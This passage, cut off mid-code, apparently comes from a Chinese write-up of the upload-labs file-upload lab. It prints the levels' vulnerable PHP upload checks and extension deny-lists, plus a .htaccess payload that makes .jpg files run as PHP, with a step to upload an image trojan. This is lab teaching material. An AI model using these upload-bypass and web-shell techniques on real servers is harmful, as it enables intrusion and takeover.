= strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strtolower(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//转换为小写&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//收尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件不允许上传!&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;先进行上传.htaccess一句话，在上传图片木马&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;FilesMatch &amp;quot;*.jpg&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;SetHandler application/x-httpd-php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;lt;/FilesMatch&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306143049283.png&#34; alt=&#34;image-20210306143049283&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306143106452.png&#34; alt=&#34;image-20210306143106452&#34;&gt;&lt;/p&gt;
&lt;p&gt;在进行上传图片木马&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306143124871.png&#34; alt=&#34;image-20210306143124871&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306143142936.png&#34; alt=&#34;image-20210306143142936&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-05大小写绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-05大小写绕过&#34;&gt;#&lt;/a&gt; Pass-05 (大小写绕过)&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cer&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aScx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aShx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aSmx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.cEr&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.sWf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.swf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htaccess&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;name&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt; = deldot(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//删除文件名末尾的点&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = strrchr(&lt;span class=&#34;variable&#34;&gt;$file_name&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;.&amp;#x27;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = str_ireplace(&lt;span class=&#34;string&#34;&gt;&amp;#x27;::$DATA&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;);&lt;span class=&#34;comment&#34;&gt;//去除字符串::$DATA&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt; = trim(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;); &lt;span class=&#34;comment&#34;&gt;//首尾去空&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!in_array(&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt; = &lt;span class=&#34;variable&#34;&gt;$_FILES&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;][&lt;span class=&#34;string&#34;&gt;&amp;#x27;tmp_name&amp;#x27;&lt;/span&gt;];&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt; = UPLOAD_PATH.&lt;span class=&#34;string&#34;&gt;&amp;#x27;/&amp;#x27;&lt;/span&gt;.date(&lt;span class=&#34;string&#34;&gt;&amp;quot;YmdHis&amp;quot;&lt;/span&gt;).rand(&lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;,&lt;span class=&#34;number&#34;&gt;9999&lt;/span&gt;).&lt;span class=&#34;variable&#34;&gt;$file_ext&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (move_uploaded_file(&lt;span class=&#34;variable&#34;&gt;$temp_file&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$img_path&lt;/span&gt;)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;true&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;上传出错！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;string&#34;&gt;&amp;#x27;此文件类型不允许上传！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125; &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = UPLOAD_PATH . &lt;span class=&#34;string&#34;&gt;&amp;#x27;文件夹不存在,请手工创建！&amp;#x27;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311193803467.png&#34; alt=&#34;image-20210311193803467&#34;&gt;&lt;/p&gt;
&lt;p&gt;成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210311193819330.png&#34; alt=&#34;image-20210311193819330&#34;&gt;&lt;/p&gt;
&lt;h2 id=&#34;pass-06空格绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-06空格绕过&#34;&gt;#&lt;/a&gt; Pass-06（空格绕过）&lt;/h2&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$is_upload&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;variable&#34;&gt;$msg&lt;/span&gt; = &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_POST&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;submit&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file_exists(UPLOAD_PATH)) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;variable&#34;&gt;$deny_ext&lt;/span&gt; = &lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;.php&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.php2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.phtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pht&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp5&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp4&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp3&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHp2&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Html&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.Htm&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.pHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jsv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jspf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSw&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSv&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jSpf&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.jHtml&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asp&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.aspx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asa&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asax&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ascx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.ashx&amp;quot;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;quot;.asmx&amp;quot;&lt;/span&gt;,&lt;span 